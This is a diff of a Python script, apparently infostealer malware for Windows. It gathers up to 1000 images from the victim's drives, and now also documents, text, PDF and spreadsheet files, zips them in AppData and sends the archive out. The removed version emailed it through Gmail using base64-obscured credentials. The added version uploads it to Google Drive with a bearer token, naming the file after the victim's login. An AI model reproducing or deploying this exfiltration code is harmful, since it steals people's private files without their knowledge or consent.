@@ -1,21 +1,19 @@
 #!/usr/bin/env python3
+
 import os
 import shutil
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import socket
 import base64
+import json
+import requests
+
 class WIN_Geat:
     def __init__(self):
         
         self.Images_CO()
-        self.Email_send()
+        self.Cloue_Store()
     def Images_CO(self):
-        self.Ecode  = 'HGbGbkgkfjudjdjdudjdmmmdjd=='             
-        self.Scode  = ';fkfkf,fjkfjfmfmfjfmfjfmfjfjf=='
+        self.Token  = ""# add the Token hare
+       
         count = 0
         if os.path.exists(os.environ["appdata"] +'\\PicBackup' ) :
            shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=False, onerror=None)
@@ -36,42 +34,40 @@ class WIN_Geat:
                         pass
                      else:
                        if '.jpg' in Files or '.png' in Files or '.jpeg' in Files\
-                            or '.webp' in Files or '.JPG' in Files\
-                            or '.PNG' in Files  or '.JPEG' in Files\
-                            or '.WEBP' in Files:
+                            or '.webp' in Files or '.JPG'  in Files\
+                            or '.PNG'  in Files or '.JPEG' in Files\
+                            or '.WEBP' in Files or '.docx' in Files\
+                            or '.DOCX' in Files or '.txt'  in Files\
+                            or '.TXT'  in Files or '.pdf'  in Files\
+                            or '.xls'  in Files or '.XLS'  in Files\
+                            or '.PDF'  in Files   :
                             with open(root+'\\'+Files,'rb') as pic:
                                 readpic = pic.read()
                             with open(Files,'wb') as pic:
                                 pic.write(readpic)
                             count +=1     
                             if count == 1000 :
-                                break
+                                break        
         shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
         shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
-    def Email_send(self):
-          msg = MIMEMultipart()
-          msg['From'] ='jacstory'
-          msg['To'] ='jacstory'
-          msg['Subject'] = "IMages Safe ".upper()
-          socket_id= socket.gethostname()
-          msg.attach(MIMEText('PicBackup','plain'))   
-          attachment= open (os.environ["appdata"]+'\\PicBackup.zip','rb')
-          filename ='PicBackup.zip'
-          part = MIMEBase('application','octect-stream')
-          part.set_payload((attachment).read())
-          encoders.encode_base64(part)
-          part.add_header('content-disposition','attachment;filename='+str(filename))
-          msg.attach(part)
-          text = msg.as_string()
-          SERVER = smtplib.SMTP('smtp.gmail.com',587)
-          SERVER.ehlo()
-          SERVER.starttls()
-          SERVER.ehlo()
-          SERVER.login(base64.b64decode(self.Ecode).decode("utf-8") ,base64.b64decode(self.Scode).decode("utf-8") )
-          SERVER.sendmail(base64.b64decode(self.Ecode).decode("utf-8"),base64.b64decode(self.Ecode).decode("utf-8") , text)
-          attachment.close()
-          SERVER.close()
-          shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=True, onerror=None)
+    def Cloue_Store(self):
+         headers = {"Authorization":"Bearer " +self.Token}
+         para = {
+                    "name":os.getlogin()+'_Documents.zip'
+                }
+         files = {
+                  'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
+                  'file': open(os.environ["appdata"]+'\\PicBackup.zip','rb')
+                 }
+         repoanse = requests.post(
+                            "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
+                             headers=headers,
+                             files=files
+                          )
+         print(repoanse.text)
+         shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
+         os.rmdir(os.environ["appdata"] +'\\PicBackup')
+         os.rmdir(os.environ["appdata"] +'\\PicBackup.zip')
 if __name__=='__main__':
     WIN_Geat()
        
